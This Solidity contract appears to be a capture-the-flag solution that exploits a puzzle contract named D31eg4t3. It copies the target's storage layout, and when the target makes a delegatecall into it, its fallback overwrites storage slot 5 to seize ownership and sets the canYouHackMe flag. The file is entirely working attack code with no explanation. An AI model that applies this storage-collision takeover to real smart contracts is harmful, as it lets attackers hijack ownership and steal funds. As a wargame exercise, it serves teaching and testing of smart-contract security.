// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Delegate.sol";

contract AttackD31eg4t3 {
    // copy storage layout from D31eg4t3
    uint a;
    uint8 b;
    string c;
    uint32 d;
    string e;
    address owner;
    mapping (address => bool) public canYouHackMe;
    // end

    address private immutable _ownerWithPower;
    D31eg4t3 private immutable d31eg4t3;
    constructor(address _d31eg4t3) {
        _ownerWithPower = msg.sender;
        d31eg4t3 = D31eg4t3(_d31eg4t3);
    }

    function hackTheD31eg4t3() external {
        d31eg4t3.hackMe("");
    }

    fallback() external {
        address overWriteOwner = _ownerWithPower;
        
        // we overwrite storage slot 5 via assembly !
        assembly {
            sstore(5, overWriteOwner)
        }

        // or just update the variable as we have the same storage layout
        canYouHackMe[_ownerWithPower] = true;
    }
}